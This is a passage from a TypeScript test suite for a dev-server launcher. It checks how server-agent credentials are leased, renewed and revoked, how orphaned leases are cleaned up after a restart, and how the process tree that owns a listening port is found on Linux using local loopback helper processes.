    expect(harness.launcher.preloadServesAt(harness.projectRoot, DEV_URL)).toBe(false);
  });

  it('counts a serving child as preloaded by construction when no connection view is wired', async () => {
    const harness = createHarness();
    await launchReady(harness);

    expect(harness.launcher.preloadServesAt(harness.projectRoot, DEV_URL)).toBe(true);
  });

  it('attributes nothing when the connection view fails', async () => {
    const harness = createHarness({
      deps: {
        serverAgentConnections: {
          isCredentialConnected: () => {
            throw new Error('registry unavailable');
          },
        },
      },
    });
    await launchReady(harness);

    expect(harness.launcher.preloadServesAt(harness.projectRoot, DEV_URL)).toBe(false);
  });

  it('refuses an external server at the requested address even while another agent of the project is connected', async () => {
    // A plain `next dev` the developer started: it answers with the framework's
    // own response header, so detection identifies it as this project's dev
    // server (an unsigned answer would be refused as `address-occupied`).
    const fetchImpl = vi.fn<FetchLike>(() =>
      Promise.resolve({
        status: 200,
        headers: { get: (name: string) => (name === 'x-powered-by' ? 'Next.js' : null) },
      }),
    );
    // Project-level presence says "connected" — for instance the preload of
    // this project's dev server on another port.
    const projectWide: ServerAgentPresence = { hasServerAgentForProject: () => true };
    const harness = createHarness({
      detect: detectDevServer,
      deps: {
        detectDeps: { fetchImpl, serverAgents: projectWide },
        serverAgentConnections: connections(new Set(['a-connected-credential'])),
      },
    });

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
      devServerUrl: 'http://127.0.0.1:4999/',
    });

    const error = expectErr(result, 'SERVER_AGENT_NOT_READY', 'running-without-preload');
    expect(error.hint).toContain('--import');
    expect(error.details).toMatchObject({ preloadReason: 'no-server-agent-connection' });
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
    expect(harness.issuer.issue).not.toHaveBeenCalled();
  });

  it('reuses its own child for a launch that names the child’s address, without detecting anything', async () => {
    const harness = createHarness();
    const { launch: first } = await launchReady(harness);
    harness.detect.mockClear();

    const again = expectOk(
      await harness.launcher.launch({ projectRoot: harness.projectRoot, devServerUrl: DEV_URL }),
    );

    expect(again).toMatchObject({ managed: true, alreadyRunning: true, pid: first.pid });
    expect(harness.detect).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(1);
  });
});

/** The `Err` a store that cannot write answers a credential operation with. */
function storeRefusal(): Result<never, DebuggenError> {
  return err(new DebuggenError('STORE_ERROR', 'The credential store refused the write.'));
}

describe('DevServerLauncher: the credential lease', () => {
  it('renews a running child’s lease every third of it, and stops renewing once the child stops', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const harness = createHarness({
      deps: { now: () => Date.now(), managedCredentialLeaseMs: 900 },
    });
    expect(Date.now()).toBe(FIXED_NOW);
    const { child } = await launchReady(harness);
    const token = harness.issuer.tokens[0] ?? '';

    expect(harness.issuer.issue.mock.calls[0]?.[0]).toStrictEqual({
      projectRoot: harness.projectRoot,
      expiresAt: FIXED_NOW + 900,
      lease: true,
    });
    expect(harness.issuer.renew).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(300);
    expect(harness.issuer.renew.mock.calls).toStrictEqual([
      [
        {
          projectRoot: harness.projectRoot,
          token,
          credentialId: 'cred-1',
          expiresAt: FIXED_NOW + 300 + 900,
        },
      ],
    ]);
    await vi.advanceTimersByTimeAsync(300);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(2);
    expect(harness.issuer.renew.mock.calls[1]?.[0]).toMatchObject({
      expiresAt: FIXED_NOW + 600 + 900,
    });

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(0);
    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
    await vi.advanceTimersByTimeAsync(3_000);

    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.renew).toHaveBeenCalledTimes(2);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('retries a refused renewal at the next interval, and stops for good once the credential is gone', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.renew.mockReturnValueOnce(storeRefusal()).mockReturnValueOnce(ok(false));
    const harness = createHarness({
      issuer,
      deps: { now: () => Date.now(), managedCredentialLeaseMs: 900 },
    });
    const { child } = await launchReady(harness);

    await vi.advanceTimersByTimeAsync(300);
    expect(issuer.renew).toHaveBeenCalledTimes(1);
    expect(serializedRecords(harness.records)).toContain('lease failed; it is retried');

    await vi.advanceTimersByTimeAsync(300);
    expect(issuer.renew).toHaveBeenCalledTimes(2);
    expect(serializedRecords(harness.records)).toContain('no longer exists');

    await vi.advanceTimersByTimeAsync(3_000);
    expect(issuer.renew).toHaveBeenCalledTimes(2);
    expect(vi.getTimerCount()).toBe(0);
    expect(child.signals).toEqual([]);

    // Nothing is left to revoke: the access boundary no longer holds the credential.
    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(0);
    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
    expect(issuer.revoke).not.toHaveBeenCalled();
  });

  it('retries a failed revocation with doubling backoff, reporting the stop incomplete until it holds', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.revoke.mockReturnValueOnce(storeRefusal()).mockReturnValueOnce(storeRefusal());
    const harness = createHarness({ issuer, deps: { now: () => Date.now() } });
    const { child } = await launchReady(harness);
    const token = issuer.tokens[0] ?? '';

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(0);
    const error = expectErr(await stopping, 'CLEANUP_PARTIAL', 'credential-revocation-pending');

    expect(error.details).toMatchObject({
      pending: 1,
      lapsesAt: FIXED_NOW + DEFAULT_MANAGED_CREDENTIAL_LEASE_MS,
    });
    expect(errorSurfaces(error)).not.toContain(token);
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.launcher.list()).toEqual([]);
    expect(issuer.revoke).toHaveBeenCalledTimes(1);

    await vi.advanceTimersByTimeAsync(REVOCATION_RETRY_INITIAL_MS - 1);
    expect(issuer.revoke).toHaveBeenCalledTimes(1);
    await vi.advanceTimersByTimeAsync(1);
    expect(issuer.revoke).toHaveBeenCalledTimes(2);
    await vi.advanceTimersByTimeAsync(REVOCATION_RETRY_INITIAL_MS * 2);
    expect(issuer.revoke).toHaveBeenCalledTimes(3);

    // Every attempt named the same one credential, never the whole project.
    for (const [input] of issuer.revoke.mock.calls) {
      expect(input).toStrictEqual({
        projectRoot: harness.projectRoot,
        token,
        credentialId: 'cred-1',
      });
    }
    expect(vi.getTimerCount()).toBe(0);
    expect(
      expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot })),
    ).toStrictEqual({ stopped: false });
    expect(issuer.revoke).toHaveBeenCalledTimes(3);
    expect(serializedRecords(harness.records)).not.toContain(token);
  });

  it('retries a pending revocation when the project is stopped again, before answering', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.revoke.mockReturnValueOnce(storeRefusal());
    const harness = createHarness({ issuer, deps: { now: () => Date.now() } });
    const { child } = await launchReady(harness);
    child.finish(0, null);
    await vi.advanceTimersByTimeAsync(0);
    expect(issuer.revoke).toHaveBeenCalledTimes(1);

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(0);

    expect(expectOk(await stopping)).toStrictEqual({ stopped: false });
    expect(issuer.revoke).toHaveBeenCalledTimes(2);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('lets a revocation that keeps failing end with its lease, never retrying past it', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.revoke.mockReturnValue(storeRefusal());
    const harness = createHarness({
      issuer,
      deps: { now: () => Date.now(), managedCredentialLeaseMs: 5_000 },
    });
    await launchReady(harness);

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(0);
    expectErr(await stopping, 'CLEANUP_PARTIAL', 'credential-revocation-pending');

    // Attempts at 0, 1 000 and 3 000 ms, and the last one at the lease's end (5 000 ms).
    await vi.advanceTimersByTimeAsync(10_000);
    expect(issuer.revoke).toHaveBeenCalledTimes(4);
    expect(vi.getTimerCount()).toBe(0);
    expect(serializedRecords(harness.records)).toContain('has lapsed');

    await vi.advanceTimersByTimeAsync(60_000);
    expect(issuer.revoke).toHaveBeenCalledTimes(4);
    expect(
      expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot })),
    ).toStrictEqual({ stopped: false });
  });

  it('makes one last revocation attempt at shutdown and leaves no timer behind', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.revoke.mockReturnValue(storeRefusal());
    const harness = createHarness({ issuer, deps: { now: () => Date.now() } });
    await launchReady(harness);

    const disposing = harness.launcher.dispose();
    await vi.advanceTimersByTimeAsync(0);
    await disposing;

    expect(issuer.revoke).toHaveBeenCalledTimes(2);
    expect(vi.getTimerCount()).toBe(0);
    expect(serializedRecords(harness.records)).toContain('could not be revoked before shutdown');
    expect(serializedRecords(harness.records)).not.toContain(issuer.tokens[0] ?? '');
  });
});

describe('serverAgentCredentialIssuer over the real access boundary', () => {
  /** A real store and access boundary in a private sandbox, closed by `release`. */
  function openBoundary(clock: () => number): {
    readonly auth: AuthService;
    readonly release: () => void;
  } {
    const home = makeSandbox('home');
    const config = expectOk(loadServiceConfig({}, { homeDir: home, debuggenHome: home }));
    const { logger } = recordingLogger();
    const store = expectOk(openStore({ config, logger }));
    const created = createAuthService({ store, config, logger, now: clock });
    if (isErr(created)) {
      store.close();
      throw new Error(`the access boundary could not start: ${created.error.message}`);
    }
    const auth = created.value;
    return {
      auth,
      release: () => {
        auth.close();
        store.close();
      },
    };
  }

  /** The principal a server-agent bearer token resolves to on the ingest route, if any. */
  function principalOf(auth: AuthService, token: string): Principal | undefined {
    const resolved = auth.authorizeHttpRequest({
      headers: { [AUTHORIZATION_HEADER]: formatBearer(token) },
      origin: undefined,
      operation: 'telemetry.event',
    });
    return isOk(resolved) && resolved.value?.role === 'server-agent' ? resolved.value : undefined;
  }

  it('revokes only the departing child’s credential: another credential of the project keeps working', async () => {
    const boundary = openBoundary(() => FIXED_NOW);
    try {
      const { auth } = boundary;
      const harness = createHarness({
        deps: { credentials: serverAgentCredentialIssuer(auth) },
      });
      // A dev server the developer started with `pnpm demo:instrumented` holds its own credential.
      const external = expectOk(
        auth.issueServerAgentCredential({ projectRoot: harness.projectRoot }),
      );
      const { child } = await launchReady(harness);
      const childToken = harness.spawner.call(0).options.env[PRELOAD_ENV_KEYS.token] ?? '';

      expect(principalOf(auth, childToken)?.expiresAt).toBe(
        FIXED_NOW + DEFAULT_MANAGED_CREDENTIAL_LEASE_MS,
      );
      expect(principalOf(auth, external.token)).toBeDefined();

      child.finish(0, null);
      await vi.waitFor(() => {
        expect(principalOf(auth, childToken)).toBeUndefined();
      });

      expect(principalOf(auth, external.token)).toBeDefined();
    } finally {
      boundary.release();
    }
  });

  it('renews only a live, expiring credential, and never revives or shortens one', async () => {
    let now = FIXED_NOW;
    const boundary = openBoundary(() => now);
    try {
      const { auth } = boundary;
      const issuer = serverAgentCredentialIssuer(auth);
      const projectRoot = makeProject('leased');
      const leased = expectOk(
        auth.issueServerAgentCredential({ projectRoot, expiresAt: FIXED_NOW + 1_000 }),
      );
      const renew = async (token: string, expiresAt: number): Promise<boolean> =>
        expectOk(await issuer.renew({ projectRoot, token, expiresAt }));

      expect(await renew(leased.token, FIXED_NOW + 5_000)).toBe(true);
      // A renewal never moves an expiry closer.
      expect(await renew(leased.token, FIXED_NOW + 2_000)).toBe(true);
      now = FIXED_NOW + 4_000;
      expect(principalOf(auth, leased.token)?.expiresAt).toBe(FIXED_NOW + 5_000);

      now = FIXED_NOW + 5_000;
      expect(principalOf(auth, leased.token)).toBeUndefined();
      expect(await renew(leased.token, FIXED_NOW + 9_000)).toBe(false);
      expect(principalOf(auth, leased.token)).toBeUndefined();

      // A credential issued without an expiry is never given one.
      const unbounded = expectOk(auth.issueServerAgentCredential({ projectRoot }));
      expect(await renew(unbounded.token, now + 1_000)).toBe(false);
      expect(principalOf(auth, unbounded.token)).toBeDefined();
      expect(principalOf(auth, unbounded.token)?.expiresAt).toBeUndefined();

      // An expiry that is not in the future is refused, not applied.
      expectErr(
        await issuer.renew({ projectRoot, token: unbounded.token, expiresAt: now }),
        'INTERNAL',
      );

      // Revocation names one credential, and a repeat finds it already gone.
      expect(expectOk(auth.revokeServerAgentCredential(unbounded.token))).toBe(true);
      expect(expectOk(auth.revokeServerAgentCredential(unbounded.token))).toBe(false);
      expect(principalOf(auth, unbounded.token)).toBeUndefined();
    } finally {
      boundary.release();
    }
  });
});

describe('addressedServerAgentPresence', () => {
  /** An online connection of the project, authenticated with `token`. */
  function connection(
    token: string,
    connectedAt: number,
    online = true,
  ): ServerAgentConnectionView {
    return { online, connectedAt, principal: { tokenHash: sha256Hex(token) } };
  }

  it('does not count a preload the launcher places at another port of the project', async () => {
    const harness = createHarness();
    await launchReady(harness);
    const childToken = harness.issuer.tokens[0] ?? '';
    const source = {
      serverAgentsForProject: () => [connection(childToken, FIXED_NOW)],
    };

    // The session's address is a plain server on another port of the same project.
    const elsewhere = addressedServerAgentPresence(
      source,
      harness.launcher,
      'http://127.0.0.1:4999/',
    );
    expect(elsewhere.hasServerAgentForProject(harness.projectRoot)).toBe(false);
    const missing = elsewhere.serverAgentForProject(harness.projectRoot);
    expect(isErr(missing) ? missing.error.code : undefined).toBe('SERVER_AGENT_NOT_READY');

    // At the child's own address it is the evidence.
    const here = addressedServerAgentPresence(source, harness.launcher, `${DEV_ORIGIN}/checkout`);
    expect(here.hasServerAgentForProject(harness.projectRoot)).toBe(true);
    expect(isOk(here.serverAgentForProject(harness.projectRoot))).toBe(true);
  });

  it('counts a connection the service cannot place, and every connection without an address', () => {
    const launcher = { addressOfCredential: (): string | undefined => undefined };
    const older = connection('developer-started-a', FIXED_NOW);
    const newer = connection('developer-started-b', FIXED_NOW + 5);
    const offline = connection('gone', FIXED_NOW + 9, false);
    const source = { serverAgentsForProject: () => [older, newer, offline] };

    const atAddress = addressedServerAgentPresence(source, launcher, 'http://127.0.0.1:4999/');
    expect(atAddress.hasServerAgentForProject('/work/app')).toBe(true);
    const latest = atAddress.serverAgentForProject('/work/app');
    expect(isOk(latest) ? latest.value : undefined).toBe(newer);

    const anywhere = addressedServerAgentPresence(source, launcher, undefined);
    expect(anywhere.hasServerAgentForProject('/work/app')).toBe(true);

    const none = addressedServerAgentPresence(
      { serverAgentsForProject: () => [offline] },
      launcher,
      undefined,
    );
    expect(none.hasServerAgentForProject('/work/app')).toBe(false);
  });
});

describe('the server-agent lease across a connection and a restart', () => {
  /**
   * A real store and access boundary in a sandbox (or in `home`, to reopen the
   * state root a previous boundary used), closed by `release`.
   */
  function boundary(
    clock: () => number,
    extra: Pick<AuthServiceDeps, 'revoker' | 'processId' | 'isProcessAlive'> & {
      readonly home?: string;
    } = {},
  ): { readonly auth: AuthService; readonly home: string; readonly release: () => void } {
    const { home: givenHome, ...deps } = extra;
    const home = givenHome ?? makeSandbox('home');
    const config = expectOk(loadServiceConfig({}, { homeDir: home, debuggenHome: home }));
    const { logger } = recordingLogger();
    const store = expectOk(openStore({ config, logger }));
    const auth = expectOk(createAuthService({ store, config, logger, now: clock, ...deps }));
    return {
      auth,
      home,
      release: () => {
        auth.close();
        store.close();
      },
    };
  }

  /** The principal a `client.hello` with a server-agent token resolves to, if any. */
  function helloOf(auth: AuthService, token: string, projectRoot: string): Principal | undefined {
    const resolved = auth.authorizeHello({
      payload: { client: 'server-agent', version: PROTOCOL_VERSION, token, projectRoot },
      origin: undefined,
    });
    return isOk(resolved) ? resolved.value : undefined;
  }

  it('keeps a connected preload’s expiry current through every renewal, and ends it at revocation', () => {
    let now = FIXED_NOW;
    const { auth, release } = boundary(() => now);
    try {
      const projectRoot = makeProject('connected');
      const leased = expectOk(
        auth.issueServerAgentCredential({ projectRoot, expiresAt: FIXED_NOW + 1_000, lease: true }),
      );
      // The socket's principal is taken once, at hello.
      const principal = helloOf(auth, leased.token, projectRoot);
      expect(principal?.expiresAt).toBe(FIXED_NOW + 1_000);

      // Past the first lease, the renewed expiry is what the socket's sweep reads.
      expect(expectOk(auth.renewServerAgentCredential(leased.token, FIXED_NOW + 5_000))).toBe(true);
      now = FIXED_NOW + 2_000;
      expect(principal?.expiresAt).toBe(FIXED_NOW + 5_000);

      // Revoked: the same principal is expired at once.
      expect(expectOk(auth.revokeServerAgentCredential(leased.token))).toBe(true);
      expect(principal?.expiresAt).toBeLessThanOrEqual(now);
    } finally {
      release();
    }
  });

  it('closes exactly the revoked credential’s sockets, never another credential’s of the project', () => {
    const closeCredential = vi.fn<(tokenHash: string, code: number, reason?: string) => number>(
      () => 1,
    );
    const revokeAll = vi.fn(() => 0);
    const { auth, release } = boundary(() => FIXED_NOW, {
      revoker: { revokeAll, closeCredential },
    });
    try {
      const projectRoot = makeProject('sockets');
      const departing = expectOk(
        auth.issueServerAgentCredential({ projectRoot, expiresAt: FIXED_NOW + 9_000, lease: true }),
      );
      const staying = expectOk(auth.issueServerAgentCredential({ projectRoot }));

      expect(expectOk(auth.revokeServerAgentCredential(departing.token))).toBe(true);

      expect(closeCredential).toHaveBeenCalledTimes(1);
      expect(closeCredential.mock.calls[0]?.[0]).toBe(sha256Hex(departing.token));
      expect(closeCredential.mock.calls[0]?.[0]).not.toBe(sha256Hex(staying.token));
      expect(revokeAll).not.toHaveBeenCalled();
      expect(helloOf(auth, staying.token, projectRoot)).toBeDefined();
      expect(helloOf(auth, departing.token, projectRoot)).toBeUndefined();
    } finally {
      release();
    }
  });

  it('revokes at start-up the leases of a service that is gone, and only those', () => {
    const PREVIOUS_PID = 424_242;
    const OTHER_LIVE_PID = 434_343;
    const projectRoot = makeProject('restart');
    const home = makeSandbox('restart-home');

    // The previous service issues two leases and a developer credential, then dies.
    const before = boundary(() => FIXED_NOW, { home, processId: PREVIOUS_PID });
    let orphan: string;
    let developer: string;
    try {
      orphan = expectOk(
        before.auth.issueServerAgentCredential({
          projectRoot,
          expiresAt: FIXED_NOW + 900_000,
          lease: true,
        }),
      ).token;
      developer = expectOk(before.auth.issueServerAgentCredential({ projectRoot })).token;
    } finally {
      before.release();
    }
    // A second, still-running service on the same state root holds one lease too.
    const sibling = boundary(() => FIXED_NOW, { home, processId: OTHER_LIVE_PID });
    let held: string;
    try {
      held = expectOk(
        sibling.auth.issueServerAgentCredential({
          projectRoot,
          expiresAt: FIXED_NOW + 900_000,
          lease: true,
        }),
      ).token;
    } finally {
      sibling.release();
    }

    const after = boundary(() => FIXED_NOW, {
      home,
      processId: 555_555,
      isProcessAlive: (pid) => pid === OTHER_LIVE_PID,
    });
    try {
      expect(helloOf(after.auth, orphan, projectRoot)).toBeDefined();

      expect(expectOk(after.auth.revokeOrphanedServerAgentLeases())).toBe(1);

      expect(helloOf(after.auth, orphan, projectRoot)).toBeUndefined();
      expect(helloOf(after.auth, held, projectRoot)).toBeDefined();
      expect(helloOf(after.auth, developer, projectRoot)).toBeDefined();
      // Idempotent: nothing is left to revoke.
      expect(expectOk(after.auth.revokeOrphanedServerAgentLeases())).toBe(0);
    } finally {
      after.release();
    }
  });

  it('leaves a lease a stopping service could not revoke to the next start, which revokes it', async () => {
    const SERVICE_PID = 777_001;
    const first = boundary(() => FIXED_NOW, { processId: SERVICE_PID });
    const projectRoot = makeProject('crashed');
    let childToken: string;
    try {
      const real = serverAgentCredentialIssuer(first.auth);
      // Every revocation fails, as with a store that refuses writes.
      const harness = createHarness({
        projectRoot,
        deps: { credentials: { ...real, revoke: () => storeRefusal() } },
      });
      await launchReady(harness);
      childToken = harness.spawner.call(0).options.env[PRELOAD_ENV_KEYS.token] ?? '';
      await harness.launcher.dispose();
      // Shutdown could not revoke it: it still authenticates.
      expect(helloOf(first.auth, childToken, projectRoot)).toBeDefined();
    } finally {
      first.release();
    }

    const restarted = boundary(() => FIXED_NOW, {
      home: first.home,
      processId: 777_002,
      isProcessAlive: (pid) => pid !== SERVICE_PID,
    });
    try {
      expect(expectOk(restarted.auth.revokeOrphanedServerAgentLeases())).toBe(1);
      expect(helloOf(restarted.auth, childToken, projectRoot)).toBeUndefined();
    } finally {
      restarted.release();
    }
  });
});

describe('DevServerLauncher.stopAll and dispose', () => {
  it('stopAll stops every child, is idempotent, and never throws', async () => {
    const harness = createHarness();
    await launchReady(harness);
    await launchReady(harness, { projectRoot: makeProject('second') }, 1, 'http://127.0.0.1:4174');

    await expect(harness.launcher.stopAll()).resolves.toStrictEqual({ survivors: [] });
    await expect(harness.launcher.stopAll()).resolves.toStrictEqual({ survivors: [] });

    expect(harness.spawner.children.map((child) => child.signals)).toEqual([
      ['SIGTERM'],
      ['SIGTERM'],
    ]);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(2);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('stopAll settles even when a child has already vanished and kill throws, reporting it as still running', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ children: [{ killThrows: true }], deps: { stopGraceMs: 100 } });
    const { child } = await launchReady(harness);

    const stopping = harness.launcher.stopAll();
    // The grace period, then the bounded wait for an exit that never comes after SIGKILL.
    await vi.advanceTimersByTimeAsync(100 + 2_000);

    await expect(stopping).resolves.toMatchObject({
      survivors: [{ projectRoot: harness.projectRoot, pid: FIRST_PID, signalFailures: 2 }],
    });
    expect(child.signals).toEqual(['SIGTERM', 'SIGKILL']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    // No exit was observed, so it is neither forgotten nor called stopped.
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'failed' }]);
    expect(vi.getTimerCount()).toBe(0);
    expect(
      harness.records.find((record) => record.message === 'Stopped a launched dev server'),
    ).toBeUndefined();
    const survivedRecord = harness.records.find(
      (record) => record.message === 'A launched dev server did not stop',
    );
    expect(survivedRecord?.level).toBe('error');
    expect(survivedRecord?.fields).toMatchObject({ escalated: true, exitObserved: false });

    child.finish(null, 'SIGKILL');
    expect(harness.launcher.list()).toEqual([]);
  });

  it('dispose stops everything, is idempotent, and refuses later launches', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    const first = harness.launcher.dispose();
    const second = harness.launcher.dispose();
    expect(second).toBe(first);
    await first;

    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expectErr(
      await harness.launcher.launch({ projectRoot: harness.projectRoot }),
      'DEV_SERVER_LAUNCH_FAILED',
      'shutting-down',
    );
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(1);
    await expect(harness.launcher.stopAll()).resolves.toStrictEqual({ survivors: [] });
    await expect(harness.launcher.dispose()).resolves.toStrictEqual({ survivors: [] });
  });
});

describe('DevServerLauncher.list', () => {
  /** Every key a registry record may carry — the whole of its public shape. */
  const RECORD_KEYS: readonly (keyof LaunchedDevServer)[] = [
    'projectRoot',
    'devServerUrl',
    'pid',
    'sessionId',
    'sessionIds',
    'credentialId',
    'startedAt',
    'status',
    'command',
    'script',
  ];

  it('exposes plain frozen records that never carry a token, an environment or arguments', async () => {
    const harness = createHarness();
    await launchReady(harness, { sessionId: 'ses-alpha' });
    await launchReady(
      harness,
      { projectRoot: makeProject('second'), command: 'next dev --port 4174' },
      1,
      'http://127.0.0.1:4174',
    );

    const records = harness.launcher.list();

    expect(Object.isFrozen(records)).toBe(true);
    expect(records).toHaveLength(2);
    for (const record of records) {
      expect(Object.isFrozen(record)).toBe(true);
      expect(RECORD_KEYS).toEqual(expect.arrayContaining(Object.keys(record)));
    }
    expect(records[0]).toStrictEqual({
      projectRoot: harness.projectRoot,
      devServerUrl: DEV_URL,
      pid: FIRST_PID,
      sessionId: 'ses-alpha',
      sessionIds: ['ses-alpha'],
      credentialId: 'cred-1',
      startedAt: FIXED_NOW,
      status: 'ready',
      command: 'pnpm',
      script: DEFAULT_SCRIPT.name,
    });
    const serialized = JSON.stringify(records);
    for (const token of harness.issuer.tokens) {
      expect(serialized).not.toContain(token);
    }
    expect(serialized).not.toContain('--port');
    expect(serialized).not.toContain(PRELOAD_ENV_KEYS.nodeOptions);
  });
});

/** How long a spawned helper lives at most, should the suite's cleanup ever miss it. */
const HELPER_LIFETIME_MS = 60_000;

/**
 * A `node -e` listener on `127.0.0.1` — on the port in `argv[1]` with
 * `reusePort` when one is given, else an ephemeral one — that prints
 * `PORT <port> PID <pid>` once listening and exits on `SIGTERM` or after
 * {@link HELPER_LIFETIME_MS}.
 */
const LISTENER_SCRIPT = [
  'const server = require("node:http").createServer((request, response) => response.end("ok"));',
  'const requested = Number(process.argv[1] ?? 0);',
  'server.listen({ port: requested, host: "127.0.0.1", reusePort: requested !== 0 }, () => {',
  ' console.log("PORT " + String(server.address().port) + " PID " + String(process.pid)); });',
  'process.on("SIGTERM", () => process.exit(0));',
  `setTimeout(() => process.exit(0), ${String(HELPER_LIFETIME_MS)}).unref();`,
].join('');

/**
 * A `node -e` parent that starts {@link LISTENER_SCRIPT} as its own child (the
 * listener is the test's grandchild), relays its stdout, and takes it down on
 * `SIGTERM` or after {@link HELPER_LIFETIME_MS}.
 */
const PARENT_SCRIPT = [
  'const { spawn } = require("node:child_process");',
  `const child = spawn(process.execPath, ["-e", ${JSON.stringify(LISTENER_SCRIPT)}], { stdio: ["ignore", "inherit", "ignore"] });`,
  'const stop = () => { child.kill("SIGKILL"); process.exit(0); };',
  'process.on("SIGTERM", stop);',
  `setTimeout(stop, ${String(HELPER_LIFETIME_MS)});`,
].join('');

/** A `node -e` process that holds no socket and waits to be stopped. */
const IDLE_SCRIPT = [
  'console.log("PORT 0 PID " + String(process.pid));',
  'process.on("SIGTERM", () => process.exit(0));',
  `setTimeout(() => process.exit(0), ${String(HELPER_LIFETIME_MS)});`,
].join('');

/** Helpers the real Linux suite spawned; every one is stopped in its `afterEach`. */
const helpers: ChildProcess[] = [];

/** Servers the real Linux suite opened in this process; every one is closed in its `afterEach`. */
const localServers: Server[] = [];

/** Spawn one helper script with `process.execPath`, piping only its stdout. */
function spawnHelper(script: string, args: readonly string[] = []): ChildProcess {
  const helper = spawnProcess(process.execPath, ['-e', script, ...args], {
    stdio: ['ignore', 'pipe', 'ignore'],
  });
  helpers.push(helper);
  return helper;
}

/** The `PORT <port> PID <pid>` line a helper prints, within ten seconds. */
function announcement(
  helper: ChildProcess,
): Promise<{ readonly port: number; readonly pid: number }> {
  return new Promise((resolve, reject) => {
    let buffer = '';
    const timer = setTimeout(() => {
      reject(new Error('the helper never announced itself'));
    }, 10_000);
    helper.stdout?.setEncoding('utf8');
    helper.stdout?.on('data', (chunk: string) => {
      buffer += chunk;
      const match = /PORT (\d+) PID (\d+)/.exec(buffer);
      if (match !== null) {
        clearTimeout(timer);
        resolve({ port: Number(match[1]), pid: Number(match[2]) });
      }
    });
    helper.once('exit', () => {
      clearTimeout(timer);
      reject(new Error('the helper exited before announcing itself'));
    });
  });
}

/** An HTTP server this test process itself listens with on `127.0.0.1`. */
async function listenHere(options: { readonly port?: number; readonly reusePort?: boolean } = {}) {
  const server = createServer((_request, response) => {
    response.end('ok');
  });
  localServers.push(server);
  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(
      { port: options.port ?? 0, host: '127.0.0.1', reusePort: options.reusePort === true },
      () => {
        resolve();
      },
    );
  });
  return { server, port: (server.address() as AddressInfo).port };
}

/** Stop a helper this suite spawned (never any other pid) and wait, bounded, for its exit. */
async function stopHelper(helper: ChildProcess): Promise<void> {
  if (helper.exitCode !== null || helper.signalCode !== null) {
    return;
  }
  const exited = new Promise<void>((resolve) => {
    helper.once('exit', () => {
      resolve();
    });
  });
  helper.kill('SIGTERM');
  const timer = setTimeout(() => helper.kill('SIGKILL'), 2_000);
  await exited;
  clearTimeout(timer);
}

const describeOnLinux = process.platform === 'linux' ? describe : describe.skip;

describeOnLinux('createListenerOwnership on Linux (real /proc, real loopback listeners)', () => {
  afterEach(async () => {
    await Promise.all(helpers.splice(0).map((helper) => stopHelper(helper)));
    await Promise.all(
      localServers.splice(0).map(
        (server) =>
          new Promise<void>((resolve) => {
            server.close(() => {
              resolve();
            });
          }),
      ),
    );
  });

  it('owns a port its direct child listens on — the root included — and so does every ancestor', async () => {
    const ownership = createListenerOwnership();
    const child = spawnHelper(LISTENER_SCRIPT);
    const { port, pid } = await announcement(child);

    expect(pid).toBe(child.pid);
    expect(await ownership.ownsListener(pid, port)).toBe(true);
    // The listener is this test process's child, so it is in this process's tree too.
    expect(await ownership.ownsListener(process.pid, port)).toBe(true);
  });

  it('denies a port a process outside the tree holds: this test process’s own listener is no child’s', async () => {
    const ownership = createListenerOwnership();
    const { port } = await listenHere();
    const idle = spawnHelper(IDLE_SCRIPT);
    const { pid } = await announcement(idle);

    expect(await ownership.ownsListener(pid, port)).toBe(false);
    expect(await ownership.ownsListener(process.pid, port)).toBe(true);
  });

  it('finds a grandchild’s listener through the process tree', async () => {
    const ownership = createListenerOwnership();
    const parent = spawnHelper(PARENT_SCRIPT);
    const { port, pid: grandchild } = await announcement(parent);
    const idle = spawnHelper(IDLE_SCRIPT);
    const { pid: unrelated } = await announcement(idle);

    expect(grandchild).not.toBe(parent.pid);
    expect(await ownership.ownsListener(parent.pid ?? 0, port)).toBe(true);
    expect(await ownership.ownsListener(grandchild, port)).toBe(true);
    expect(await ownership.ownsListener(unrelated, port)).toBe(false);
  });

  it('requires every listener on the port: one shared with a process outside the tree (SO_REUSEPORT) is not owned', async () => {
    const ownership = createListenerOwnership();
    const { port } = await listenHere({ reusePort: true });
    const child = spawnHelper(LISTENER_SCRIPT, [String(port)]);
